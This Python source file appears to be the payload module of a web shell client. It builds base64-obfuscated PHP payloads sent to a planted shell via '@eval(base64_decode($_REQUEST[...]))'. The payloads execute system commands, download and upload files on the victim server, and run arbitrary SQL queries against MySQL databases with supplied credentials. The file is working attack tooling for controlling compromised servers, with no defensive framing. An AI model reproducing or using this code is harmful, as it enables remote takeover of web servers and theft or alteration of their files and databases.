#!/usr/bin/env python
# encoding: utf-8

import sys
sys.path.append('..')
from lib.core.payloader import Payloader
import base64

class PhpPayloader(Payloader):

    def parseCmd(self, osType, pwd, cmd, payload):
        if osType == 'windows':
            currentDirCmd = 'cd'
            divSymble = '&'
        else:
            currentDirCmd = 'pwd'
            divSymble = ';'
        cmd = 'cd ' + pwd + divSymble + cmd + divSymble + 'echo [S]' + divSymble + currentDirCmd + divSymble + 'echo [E]'
        payload['c0'] = base64.b64encode('system("' + cmd + '");')
        payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'

    def parseDownload(self, remoteFilePath, payload):
        payload['c1'] = remoteFilePath
        payload['c0'] = 'JGY9Zm9wZW4oJF9SRVFVRVNUWydjMSddLCdyJykgb3IgZGllKCdbU11OT0ZJTEVbRV0nKTtlY2hvIGZyZWFkKCRmLGZpbGVzaXplKCRfUkVRVUVTVFsnYzEnXSkpOw=='
        payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'

    def parseUpload(self, remoteFilePath, fileContent, payload):
        payload['c2'] = fileContent
        payload['c1'] = remoteFilePath
        payload['c0'] = 'JGY9Zm9wZW4oJF9SRVFVRVNUWydjMSddLCd3Jykgb3IgZGllKCdbU11OT0ZJTEVbRV0nKTtmd3JpdGUoJGYsJF9SRVFVRVNUWydjMiddKTtmY2xvc2UoJGYpOw=='
        payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'

    def parseSql(self, dbms, dbHost, dbUserName, dbPassword, db, sql, payload):
        if dbms == 'mysql':
            if db == '':
                payload['c4'] = base64.b64encode(sql)
                payload['c3'] = dbPassword
                payload['c2'] = dbUserName
                payload['c1'] = dbHost
                payload['c0'] = 'bXlzcWxfY29ubmVjdCgkX1JFUVVFU1RbJ2MxJ10sJF9SRVFVRVNUWydjMiddLCRfUkVRVUVTVFsnYzMnXSlvciBkaWUoJ1tTXUZBSUxbRV0nKTskcmVzdWx0PW15c3FsX3F1ZXJ5KGJhc2U2NF9kZWNvZGUoJF9SRVFVRVNUWydjNCddKSk7JHI9YXJyYXkoKTt3aGlsZSgkcm93PW15c3FsX2ZldGNoX2Fzc29jKCRyZXN1bHQpKXskcltdPSRyb3c7fWVjaG8ganNvbl9lbmNvZGUoJHIpOw=='
                payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'
            else:
                payload['c5'] = base64.b64encode(sql)
                payload['c4'] = db
                payload['c3'] = dbPassword
                payload['c2'] = dbUserName
                payload['c1'] = dbHost
                payload['c0'] = 'bXlzcWxfY29ubmVjdCgkX1JFUVVFU1RbJ2MxJ10sJF9SRVFVRVNUWydjMiddLCRfUkVRVUVTVFsnYzMnXSlvciBkaWUoJ1tTXUZBSUxbRV0nKTtteXNxbF9zZWxlY3RfZGIoJF9SRVFVRVNUWydjNCddKTskcmVzdWx0PW15c3FsX3F1ZXJ5KGJhc2U2NF9kZWNvZGUoJF9SRVFVRVNUWydjNSddKSk7JHI9YXJyYXkoKTt3aGlsZSgkcm93PW15c3FsX2ZldGNoX2Fzc29jKCRyZXN1bHQpKXskcltdPSRyb3c7fWVjaG8ganNvbl9lbmNvZGUoJHIpOw=='
                payload[self.password] = '@eval(base64_decode($_REQUEST["c0"]));'
        elif dbms == 'sqlserver':
            payload = []
        elif dbms == 'oracle':
            payload = []
        elif dbms == 'access':
            payload = []
